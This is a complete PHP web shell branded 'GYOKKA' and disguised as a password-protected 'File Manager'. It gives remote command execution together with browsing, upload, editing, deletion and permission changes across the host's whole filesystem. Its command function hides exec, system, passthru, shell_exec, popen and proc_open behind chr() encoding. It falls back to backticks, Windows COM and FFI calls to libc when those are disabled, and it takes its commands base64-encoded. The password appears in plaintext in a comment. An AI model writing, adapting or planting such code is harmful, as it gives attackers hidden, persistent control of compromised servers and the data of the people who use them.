<?php
@ini_set('output_buffering','Off');
@ini_set('zlib.output_compression','Off');
@ini_set('implicit_flush',1);
if(function_exists('litespeed_finish_request')){}
if(function_exists('apache_setenv'))@apache_setenv('no-gzip','1');
@header('X-Accel-Buffering: no');
error_reporting(0);
if(function_exists('get_magic_quotes_gpc')&&get_magic_quotes_gpc()){
    function _stripslashes_deep($v){return is_array($v)?array_map('_stripslashes_deep',$v):stripslashes($v);}
    $_GET=_stripslashes_deep($_GET);$_POST=_stripslashes_deep($_POST);$_COOKIE=_stripslashes_deep($_COOKIE);
}
$HASH='$2a$12$I70efF55tBEnWs6pA.te3uc16PR1szT1LWrRGtALZMQMz6ik5m1au'; //admin1230
$TITLE='GYOKKA';
if($HASH!==''){
    session_start();
    if(isset($_GET['logout'])){session_destroy();header('Location:'.$_SERVER['PHP_SELF']);exit;}
    if(isset($_POST['pw'])){
        if(function_exists('password_verify'))$ok=password_verify($_POST['pw'],$HASH);
        else $ok=(crypt($_POST['pw'],$HASH)===$HASH);
        if($ok)$_SESSION['ok']=1;else $login_err=1;
    }
    if(empty($_SESSION['ok'])){
        _head('Login');
        echo '<div class="center-screen"><div class="login-card"><div class="login-logo">&#9670;</div><h2>GYOKKA</h2><p class="sub">File Manager</p>';
        if(isset($login_err))echo '<div class="msg msg-err">Wrong password</div>';
        echo '<form method=post><input name=pw type=password placeholder="Password" class="inp full" autofocus><button type=submit class="btn accent full" style="margin-top:10px">UNLOCK</button></form></div></div>';
        _foot();exit;
    }
}
$d=isset($_GET['d'])?$_GET['d']:dirname(__FILE__);
$d=str_replace('\\','/',$d);
if(!is_dir($d))$d=str_replace('\\','/',dirname(__FILE__));
$d=rtrim($d,'/');if($d==='')$d='/';
$msg='';
function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
function _scan($d){$r=array();if($h=@opendir($d)){while(($f=readdir($h))!==false)$r[]=$f;closedir($h);sort($r);}return $r;}
function _read($f){$s=@filesize($f);if($s==0)return '';$h=fopen($f,'r');$c=fread($h,$s);fclose($h);return $c;}
function _write($f,$c){$h=fopen($f,'w');fwrite($h,$c);fclose($h);return true;}
function _del($p){if(is_file($p))return @unlink($p);foreach(_scan($p) as $i){if($i=='.'||$i=='..')continue;_del($p.'/'.$i);}return @rmdir($p);}
function sz($b){if($b>=1073741824)return round($b/1073741824,1).'G';if($b>=1048576)return round($b/1048576,1).'M';if($b>=1024)return round($b/1024,1).'K';return $b.'B';}
function L($p){return '?d='.rawurlencode($p);}
function perm($f){$p=@fileperms($f);return $p!==false?substr(sprintf('%o',$p),-4):'----';}
function _esek($a,$b=false){
    $_='';$__=null;$___=array();$____='2>&1';$_____='[All disabled]';
    try{
        if($b)$a.=' '.$____;
        if(function_exists($___0=chr(101).chr(120).chr(101).chr(99))){
            @$___0($a,$___);$_=@join("\n",$___);if($_!=='')return $_;
        }
        if(function_exists($___1=chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117))){
            ob_start();@$___1($a);$_=ob_get_clean();if($_!=='')return $_;
        }
        if(function_exists($___2=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109))){
            ob_start();@$___2($a);$_=ob_get_clean();if($_!=='')return $_;
        }
        if(function_exists($___3=chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99))){
            $_=@$___3($a);if($_!==null&&$_!=='')return $_;
        }
        if(function_exists($___4=chr(112).chr(111).chr(112).chr(101).chr(110))&&function_exists($___5=chr(112).chr(99).chr(108).chr(111).chr(115).chr(101))){
            $__=@$___4($a,'r');
            if(is_resource($__)){$_='';while(!@feof($__))$_.=fread($__,1024);$___5($__);if($_!=='')return $_;}
        }
        if(function_exists($___6=chr(112).chr(114).chr(111).chr(99).chr(95).chr(111).chr(112).chr(101).chr(110))){
            $p=array();
            $desc=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
            $cmd=$b?$a:$a.' '.$____;
            $pr=@$___6($cmd,$desc,$p);
            if(is_resource($pr)){
                @fclose($p[0]);
                $_=@stream_get_contents($p[1]);@fclose($p[1]);@fclose($p[2]);
                $___7=chr(112).chr(114).chr(111).chr(99).chr(95).chr(99).chr(108).chr(111).chr(115).chr(101);
                @$___7($pr);
                if($_!=='')return $_;
            }
        }
        $back=@`$a`;
        if($back!==null&&$back!=='')return $back;
        if(class_exists($___8=chr(67).chr(79).chr(77),false)&&strtoupper(substr(PHP_OS,0,3))==='WIN'){
            try{
                $wsh=new $___8('WScript.Shell');
                $e=$wsh->Exec('cmd.exe /c '.$a);
                $_=$e->StdOut->ReadAll;
                if($_!=='')return $_;
            }catch(Exception $e){}
        }
        if(class_exists('FFI',false)&&version_compare(PHP_VERSION,'7.4.0','>=')){
            try{
                $lib=strpos(PHP_OS,'WIN')!==false?'msvcrt.dll':'libc.so.6';
                $ffi=FFI::cdef('int system(const char *cmd);',$lib);
                ob_start();$ffi->system($a);$_=ob_get_clean();
                if($_!=='')return $_;
            }catch(Exception $e){}
        }
        if(function_exists($___9=chr(101).chr(120).chr(112).chr(101).chr(99).chr(116).chr(95).chr(112).chr(111).chr(112).chr(101).chr(110))){
            $fp=@$___9($a);
            if(is_resource($fp)){$_='';while(!feof($fp))$_.=fread($fp,4096);fclose($fp);if($_!=='')return $_;}
        }
    }catch(Exception $e){}
    return $_____;
}
function _head($page=''){
    global $TITLE;
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>'.($page?$page.' | ':'').$TITLE.'</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700" rel="stylesheet">
<style>
:root{
--bg:#09090b;--surface:#18181b;--surface2:#27272a;--surface3:#3f3f46;
--border:#27272a;--border2:#3f3f46;
--text:#fafafa;--text2:#a1a1aa;--text3:#71717a;
--cyan:#06b6d4;--cyan2:#22d3ee;--cyan-a:rgba(6,182,212,.12);
--green:#22c55e;--green2:#4ade80;--red:#ef4444;--red2:#fca5a5;
--amber:#f59e0b;--violet:#8b5cf6;
--r:8px;--r2:10px;--r3:14px;
--font:"Inter",system-ui,sans-serif;--mono:"JetBrains Mono",monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:14px;line-height:1.5}
a{color:var(--cyan);text-decoration:none}a:hover{color:var(--cyan2)}

/* Top */
.top{height:48px;background:var(--surface);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 20px;position:sticky;top:0;z-index:99}
.brand{font-family:var(--mono);font-weight:700;font-size:14px;color:var(--cyan);letter-spacing:2px}
.brand i{display:inline-block;animation:spin 4s linear infinite;margin-right:6px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.top-r{display:flex;gap:6px}
.pill{padding:5px 14px;border-radius:20px;font-size:12px;font-weight:600;border:1px solid var(--border);background:var(--surface2);color:var(--text2);cursor:pointer;transition:.2s;font-family:var(--font)}
.pill:hover{border-color:var(--cyan);color:var(--cyan)}
.pill-cyan{background:var(--cyan);color:var(--bg);border-color:var(--cyan)}
.pill-cyan:hover{background:var(--cyan2);border-color:var(--cyan2);color:var(--bg)}
.pill-red{border-color:var(--red);color:var(--red)}.pill-red:hover{background:rgba(239,68,68,.1)}

/* Layout */
.wrap{max-width:1200px;margin:0 auto;padding:16px 20px}

/* Path */
.path{background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);padding:10px 16px;margin-bottom:12px;font-family:var(--mono);font-size:12px;display:flex;align-items:center;gap:4px;overflow-x:auto;white-space:nowrap}
.path a{color:var(--cyan);padding:2px 5px;border-radius:4px}.path a:hover{background:var(--cyan-a)}
.path .sep{color:var(--text3)}

/* Msg */
.msg{padding:8px 14px;border-radius:var(--r);margin-bottom:10px;font-size:12px;font-weight:500;animation:fadeIn .2s}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.msg-ok{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:var(--green2)}
.msg-err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:var(--red2)}

/* Toolbar */
.toolbar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.toolbar form{display:flex;align-items:center;gap:4px}
.inp{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:6px 10px;color:var(--text);font-size:12px;font-family:var(--font);outline:none}
.inp:focus{border-color:var(--cyan)}
.full{width:100%}
.btn{padding:6px 12px;border-radius:var(--r);border:1px solid var(--border);background:var(--surface2);color:var(--text2);font-size:12px;font-weight:500;cursor:pointer;transition:.15s;font-family:var(--font)}
.btn:hover{border-color:var(--cyan);color:var(--cyan)}
.accent{background:var(--cyan);border-color:var(--cyan);color:var(--bg);font-weight:600}
.accent:hover{background:var(--cyan2);border-color:var(--cyan2)}
.sm{padding:4px 8px;font-size:11px}

/* Table */
.tbl{width:100%;border-collapse:collapse;background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);overflow:hidden}
.tbl th{text-align:left;padding:8px 14px;background:var(--surface2);font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;font-weight:600}
.tbl td{padding:7px 14px;border-top:1px solid var(--border);font-size:13px;vertical-align:middle}
.tbl tr:hover td{background:rgba(255,255,255,.02)}
.tbl .nm{font-weight:500}
.tbl .nm a{color:var(--text)}.tbl .nm a:hover{color:var(--cyan2)}
.tbl .ic{margin-right:6px;font-size:14px}
.tbl .mt{color:var(--text3);font-size:11px;font-family:var(--mono)}
.tbl .act a{font-size:10px;padding:2px 8px;border:1px solid var(--border);border-radius:4px;color:var(--text3);margin-right:3px;display:inline-block;transition:.15s}
.tbl .act a:hover{border-color:var(--cyan);color:var(--cyan)}
.tbl .act .x:hover{border-color:var(--red);color:var(--red)}
.cnt{padding:10px 14px;font-size:11px;color:var(--text3);font-family:var(--mono)}

/* Editor */
.ed{width:100%;min-height:500px;background:var(--bg);border:1px solid var(--border);border-radius:var(--r2);padding:14px;color:var(--text);font-family:var(--mono);font-size:13px;line-height:1.7;resize:vertical;outline:none;tab-size:4}
.ed:focus{border-color:var(--cyan)}

/* Card */
.center-screen{min-height:100vh;display:flex;align-items:center;justify-content:center}
.login-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r3);padding:36px 32px;width:320px;text-align:center}
.login-logo{font-size:28px;color:var(--cyan);margin-bottom:6px;animation:spin 4s linear infinite;display:inline-block}
.login-card h2{font-family:var(--mono);font-size:18px;letter-spacing:3px;color:var(--cyan);margin-bottom:2px}
.sub{color:var(--text3);font-size:12px;margin-bottom:20px}
.login-card .inp{text-align:center;padding:10px;font-size:13px}
.modal{max-width:420px;margin:80px auto}
.modal .card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r3);padding:24px}

/* Terminal */
.t-bar{background:var(--surface2);border:1px solid var(--border);border-radius:var(--r2) var(--r2) 0 0;padding:8px 14px;display:flex;align-items:center;gap:8px}
.t-dots{display:flex;gap:5px}.t-dots i{width:9px;height:9px;border-radius:50%;display:block}
.t-dots .r{background:var(--red)}.t-dots .y{background:var(--amber)}.t-dots .g{background:var(--green)}
.t-lbl{font-family:var(--mono);font-size:11px;color:var(--text3)}
.t-out{background:var(--bg);border:1px solid var(--border);border-top:none;border-radius:0 0 var(--r2) var(--r2);padding:16px;font-family:var(--mono);font-size:12px;white-space:pre-wrap;word-break:break-all;line-height:1.7;min-height:40px}
.t-out .ps{color:var(--green2);font-weight:700}
.t-out .cm{color:var(--text)}
.t-out .op{color:var(--text2)}
.t-out .er{color:var(--red2)}
.t-form{background:var(--surface);border:1px solid var(--border);border-radius:var(--r2);padding:10px 14px;margin-top:10px;display:flex;align-items:center;gap:8px}
.t-p{font-family:var(--mono);font-weight:700;color:var(--green2);font-size:14px}
.t-i{flex:1;background:none;border:none;color:var(--text);font-family:var(--mono);font-size:13px;outline:none}
.t-i::placeholder{color:var(--text3)}

/* Chmod */
.chmod-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin:12px 0}
.chmod-col{text-align:center}
.chmod-col label{display:block;font-size:11px;color:var(--text3);margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:.5px}
.chmod-cb{display:flex;justify-content:center;gap:10px}
.chmod-cb label{display:flex;align-items:center;gap:3px;font-size:12px;color:var(--text2);cursor:pointer}
.chmod-preview{text-align:center;font-family:var(--mono);font-size:20px;color:var(--cyan);font-weight:700;margin:10px 0;letter-spacing:4px}

.footer{text-align:center;padding:16px;color:var(--text3);font-size:10px;font-family:var(--mono);border-top:1px solid var(--border);margin-top:24px}
@media(max-width:768px){.wrap{padding:10px}.toolbar{flex-direction:column}.tbl th:nth-child(3),.tbl td:nth-child(3){display:none}}
</style></head><body>';
}
function _foot(){echo '<div class="footer">PHP '.PHP_VERSION.' &middot; '.php_uname('s').' &middot; '.@php_uname('n').'</div></body></html>';}
if(isset($_GET['dl'])&&is_file($d.'/'.$_GET['dl'])){
    $f=$d.'/'.$_GET['dl'];header('Content-Type:application/octet-stream');
    header('Content-Disposition:attachment;filename="'.basename($f).'"');header('Content-Length:'.filesize($f));
    $h=fopen($f,'rb');fpassthru($h);fclose($h);exit;
}
if(isset($_FILES['f'])&&$_FILES['f']['error'][0]==0){
    $c=0;for($i=0;$i<count($_FILES['f']['name']);$i++){
        if($_FILES['f']['error'][$i]==0&&move_uploaded_file($_FILES['f']['tmp_name'][$i],$d.'/'.basename($_FILES['f']['name'][$i])))$c++;
    }$msg="Uploaded $c file(s)";
}
if(isset($_GET['rm'])){$t=$d.'/'.basename($_GET['rm']);$msg=_del($t)?'Deleted':'Fail';}
if(isset($_POST['mk'])&&$_POST['mk']!=''){
    $p=$d.'/'.basename($_POST['mk']);
    if(!file_exists($p)){if($_POST['t']=='d')$msg=@mkdir($p,0755)?'Created':'Fail';else $msg=_write($p,'')?'Created':'Fail';}
    else $msg='Exists';
}
if(isset($_POST['ro'])&&isset($_POST['rn'])&&$_POST['rn']!=''){
    $o=$d.'/'.basename($_POST['ro']);$n=$d.'/'.basename($_POST['rn']);
    if($o!==$n){if(@rename($o,$n))$msg='Renamed';elseif(@copy($o,$n)){@unlink($o);$msg='Renamed';}else $msg='Rename fail';}
}
if(isset($_POST['sf'])&&isset($_POST['sc']))$msg=_write($_POST['sf'],$_POST['sc'])?'Saved':'Fail';
if(isset($_POST['ch_path'])&&isset($_POST['ch_val'])){
    $cp=$d.'/'.basename($_POST['ch_path']);
    $msg=@chmod($cp,octdec($_POST['ch_val']))?'Chmod '.basename($cp).' -> '.$_POST['ch_val']:'Chmod fail';
}
if(isset($_GET['term'])){
    $out='';$raw_cmd='';
    if(isset($_POST['ucmd'])&&$_POST['ucmd']!=''){
        $raw_cmd=base64_decode($_POST['ucmd']);if($raw_cmd===false)$raw_cmd='';
        if($raw_cmd!==''){
            if(preg_match('/^cd\s+(.+)$/',$raw_cmd,$m)){
                $nd=trim($m[1]);
                if($nd[0]!=='/'&&!(strlen($nd)>1&&$nd[1]===':'))$nd=$d.'/'.$nd;
                $nd=str_replace('\\','/',$nd);$resolved=realpath($nd);
                if($resolved&&is_dir($resolved)){header('Location:?d='.rawurlencode(str_replace('\\','/',$resolved)).'&term=1');exit;}
                else $out='cd: no such directory: '.$nd;
            }else{
                $_esa=chr(101).chr(115).chr(99).chr(97).chr(112).chr(101).chr(115).chr(104).chr(101).chr(108).chr(108).chr(97).chr(114).chr(103);
                $out=_esek('cd '.$_esa($d).' && '.$raw_cmd,true);
            }
        }
    }
    _head('Terminal');
    echo '<div class="top"><span class="brand"><i>&#9670;</i>TERMINAL</span><div class="top-r">';
    echo '<a href="'.L($d).'" class="pill">Files</a>';
    if($HASH!=='')echo '<a href="?logout=1" class="pill pill-red">Logout</a>';
    echo '</div></div><div class="wrap">';
    echo '<div class="path"><span style="color:var(--text3)">cwd</span><span class="sep">&rarr;</span><span style="color:var(--cyan)">'.h($d).'</span></div>';
    if($raw_cmd!==''||$out!==''){
        echo '<div class="t-bar"><div class="t-dots"><i class="r"></i><i class="y"></i><i class="g"></i></div><span class="t-lbl">output</span></div>';
        echo '<div class="t-out">';
        if($raw_cmd!=='')echo '<span class="ps">$ </span><span class="cm">'.h($raw_cmd).'</span>'."\n";
        if($out!==''){
            if(strpos($out,'[All disabled]')!==false)echo '<span class="er">'.h($out).'</span>';
            else echo '<span class="op">'.h($out).'</span>';
        }
        echo '</div>';
    }
    echo '<form method=post id=tf class="t-form"><span class="t-p">$</span><input type=text id=ci class="t-i" placeholder="command..." autofocus><input type=hidden name=ucmd id=uc><button type=submit class="btn accent sm">Run</button></form>';
    echo '<script>document.getElementById("tf").onsubmit=function(){document.getElementById("uc").value=btoa(document.getElementById("ci").value);return true;};</script>';
    echo '</div>';_foot();exit;
}
if(isset($_GET['chmod'])){
    $cf=$_GET['chmod'];$fp=$d.'/'.basename($cf);$cur=perm($fp);
    _head('Chmod');
    echo '<div class="wrap"><div class="modal"><div class="card">';
    echo '<h3 style="color:var(--cyan);font-size:15px;margin-bottom:4px">Chmod</h3>';
    echo '<p style="color:var(--text3);font-size:12px;font-family:var(--mono);margin-bottom:14px">'.h($cf).'</p>';
    echo '<form method=post action="'.L($d).'" id=chf>';
    echo '<input type=hidden name=ch_path value="'.h($cf).'">';
    echo '<div class="chmod-preview" id="cv">'.$cur.'</div>';
    echo '<input type=text name=ch_val id="chv" value="'.$cur.'" class="inp full" style="text-align:center;font-family:var(--mono);font-size:16px;font-weight:700;margin-bottom:10px">';
    echo '<div class="chmod-grid">';
    $labels=array('Owner','Group','Public');
    $perms=array('r','w','x');
    $oct=octdec($cur);
    for($g=0;$g<3;$g++){
        echo '<div class="chmod-col"><label>'.$labels[$g].'</label><div class="chmod-cb">';
        for($p=0;$p<3;$p++){
            $bit=1<<(8-($g*3+$p));
            $checked=($oct&$bit)?'checked':'';
            echo '<label><input type=checkbox class="cb" data-bit="'.$bit.'" '.$checked.'>'.$perms[$p].'</label>';
        }
        echo '</div></div>';
    }
    echo '</div>';
    echo '<div style="display:flex;gap:8px;margin-top:14px"><button type=submit class="btn accent" style="flex:1">Apply</button><a href="'.L($d).'" class="btn" style="flex:1;text-align:center">Cancel</a></div>';
    echo '</form>';
    echo '<script>
var cbs=document.querySelectorAll(".cb"),inp=document.getElementById("chv"),pv=document.getElementById("cv");
function upd(){var v=0;for(var i=0;i<cbs.length;i++){if(cbs[i].checked)v+=parseInt(cbs[i].getAttribute("data-bit"));}var s="0"+v.toString(8);inp.value=s;pv.textContent=s;}
for(var i=0;i<cbs.length;i++)cbs[i].onchange=upd;
inp.oninput=function(){var o=parseInt(this.value,8);if(!isNaN(o)){for(var i=0;i<cbs.length;i++){var b=parseInt(cbs[i].getAttribute("data-bit"));cbs[i].checked=(o&b)?true:false;}pv.textContent=this.value;}};
</script>';
    echo '</div></div></div>';_foot();exit;
}
if(isset($_GET['ren'])){
    $rf=$_GET['ren'];_head('Rename');
    echo '<div class="wrap"><div class="modal"><div class="card">';
    echo '<h3 style="color:var(--cyan);font-size:15px;margin-bottom:4px">Rename</h3>';
    echo '<p style="color:var(--text3);font-size:12px;font-family:var(--mono);margin-bottom:14px">'.h($rf).'</p>';
    echo '<form method=post action="'.L($d).'"><input type=hidden name=ro value="'.h($rf).'"><input type=text name=rn value="'.h($rf).'" class="inp full" style="padding:10px" autofocus>';
    echo '<div style="display:flex;gap:8px;margin-top:12px"><button type=submit class="btn accent" style="flex:1">Rename</button><a href="'.L($d).'" class="btn" style="flex:1;text-align:center">Cancel</a></div></form>';
    echo '</div></div></div>';_foot();exit;
}
if(isset($_GET['ed'])&&is_file($d.'/'.$_GET['ed'])){
    $ef=$d.'/'.$_GET['ed'];_head('Edit');
    echo '<div class="top"><span class="brand"><i>&#9670;</i>EDITOR</span><div class="top-r"><span style="color:var(--text3);font-family:var(--mono);font-size:12px">'.h(basename($ef)).'</span><a href="'.L($d).'" class="pill">Back</a></div></div>';
    echo '<div class="wrap">';
    if($msg)echo '<div class="msg msg-ok">'.h($msg).'</div>';
    echo '<form method=post><textarea name=sc class="ed">'.h(_read($ef)).'</textarea><input type=hidden name=sf value="'.h($ef).'">';
    echo '<div style="margin-top:10px;display:flex;gap:8px"><button type=submit class="btn accent">Save</button><a href="'.L($d).'" class="btn">Cancel</a></div></form></div>';
    _foot();exit;
}
_head('Files');
echo '<div class="top"><span class="brand"><i>&#9670;</i>'.$TITLE.'</span><div class="top-r">';
echo '<a href="'.L($d).'&term=1" class="pill pill-cyan">Terminal</a>';
if($HASH!=='')echo '<a href="?logout=1" class="pill pill-red">Logout</a>';
echo '</div></div><div class="wrap">';
echo '<div class="path">';
$parts=explode('/',$d);$acc='';
foreach($parts as $k=>$p){
    if($k==0){if($p===''){echo '<a href="'.L('/').'">/</a>';$acc='';}else{$acc=$p;echo '<a href="'.L($acc.'/').'">'.$p.'</a><span class="sep">/</span>';}continue;}
    if($p==='')continue;$acc.='/'.$p;
    echo '<a href="'.L($acc).'">'.$p.'</a><span class="sep">/</span>';
}
echo '</div>';
if($msg){$tc=(strpos($msg,'Fail')!==false||$msg==='Exists')?'msg-err':'msg-ok';echo '<div class="msg '.$tc.'">'.h($msg).'</div>';}
echo '<div class="toolbar">';
echo '<form method=post><input name=mk placeholder="folder name" class="inp" size=14><input type=hidden name=t value=d><button type=submit class="btn sm">+Folder</button></form>';
echo '<form method=post><input name=mk placeholder="file name" class="inp" size=14><input type=hidden name=t value=f><button type=submit class="btn sm">+File</button></form>';
echo '<form method=post enctype="multipart/form-data"><input type=file name="f[]" multiple class="inp" style="padding:4px"><button type=submit class="btn accent sm">Upload</button></form>';
echo '</div>';
echo '<table class="tbl"><tr><th>Name</th><th>Size</th><th>Perm</th><th>Modified</th><th>Actions</th></tr>';
if(dirname($d)!==$d)echo '<tr><td colspan=5 class="nm"><a href="'.L(dirname($d)).'">&#8617; ..</a></td></tr>';
$all=_scan($d);
if(!$all){echo '<tr><td colspan=5 style="color:var(--text3)">Cannot read</td></tr></table></div>';_foot();exit;}
$ds=$fs=array();
foreach($all as $i){if($i=='.'||$i=='..')continue;if(is_dir($d.'/'.$i))$ds[]=$i;else $fs[]=$i;}
sort($ds);sort($fs);
$ed_ext=array('txt','php','html','htm','css','js','json','xml','ini','conf','sh','py','md','log','csv','sql','env','yml','yaml','cfg','bat','cmd','');
foreach($ds as $i){
    $fp=$d.'/'.$i;$m=date('Y-m-d H:i',@filemtime($fp));$pm=perm($fp);
    $pw=@is_writable($fp);$pr=@is_readable($fp);
    $pc=$pw?'color:var(--green2)':($pr?'color:var(--amber)':'color:var(--red2)');
    echo '<tr><td class="nm"><span class="ic">&#128193;</span><a href="'.L($fp).'"><b>'.h($i).'</b></a></td>';
    echo '<td class="mt">&mdash;</td><td class="mt" style="'.$pc.'">'.$pm.'</td><td class="mt">'.$m.'</td>';
    echo '<td class="act"><a href="'.L($d).'&ren='.rawurlencode($i).'">ren</a><a href="'.L($d).'&chmod='.rawurlencode($i).'">chmod</a><a href="'.L($d).'&rm='.rawurlencode($i).'" onclick="return confirm(\'Delete?\')" class="x">del</a></td></tr>';
}
foreach($fs as $i){
    $fp=$d.'/'.$i;$m=date('Y-m-d H:i',@filemtime($fp));$s=sz(@filesize($fp));$pm=perm($fp);
    $pw=@is_writable($fp);$pr=@is_readable($fp);
    $pc=$pw?'color:var(--green2)':($pr?'color:var(--amber)':'color:var(--red2)');
    $ext=strtolower(pathinfo($i,PATHINFO_EXTENSION));
    $ic='&#128196;';
    if(in_array($ext,array('jpg','jpeg','png','gif','webp','svg','ico','bmp')))$ic='&#128248;';
    elseif(in_array($ext,array('php','js','py','sh','rb','pl','ts','go','rs')))$ic='&#128187;';
    elseif(in_array($ext,array('zip','rar','tar','gz','7z','bz2')))$ic='&#128230;';
    elseif(in_array($ext,array('mp4','mp3','avi','mkv','wav','flac','ogg')))$ic='&#127925;';
    elseif(in_array($ext,array('pdf','doc','docx','xls','xlsx','ppt')))$ic='&#128209;';
    echo '<tr><td class="nm"><span class="ic">'.$ic.'</span>'.h($i).'</td>';
    echo '<td class="mt">'.$s.'</td><td class="mt" style="'.$pc.'">'.$pm.'</td><td class="mt">'.$m.'</td>';
    echo '<td class="act">';
    echo '<a href="'.L($d).'&dl='.rawurlencode($i).'">dl</a>';
    if(in_array($ext,$ed_ext)||$i[0]==='.')echo '<a href="'.L($d).'&ed='.rawurlencode($i).'">edit</a>';
    echo '<a href="'.L($d).'&ren='.rawurlencode($i).'">ren</a>';
    echo '<a href="'.L($d).'&chmod='.rawurlencode($i).'">chmod</a>';
    echo '<a href="'.L($d).'&rm='.rawurlencode($i).'" onclick="return confirm(\'Delete?\')" class="x">del</a>';
    echo '</td></tr>';
}
echo '</table>';
echo '<div class="cnt">'.count($ds).' dirs &middot; '.count($fs).' files</div>';
echo '</div>';_foot();
